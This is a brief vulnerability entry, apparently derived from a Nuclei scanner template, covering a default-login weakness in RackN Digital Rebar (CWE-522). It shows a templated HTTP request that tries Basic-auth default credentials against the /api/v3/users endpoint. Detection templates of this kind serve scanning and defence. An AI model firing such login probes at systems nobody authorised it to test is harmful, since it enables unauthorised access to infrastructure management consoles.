# Vulnerability: RackN Digital Rebar Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`digitalrebar-default-login.yaml`)

## Description
A RackN Digital Rebar default login was discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /api/v3/users HTTP/1.1
Host: {{Hostname}}
Authorization: Basic {{base64(username + ':' + password)}}
```

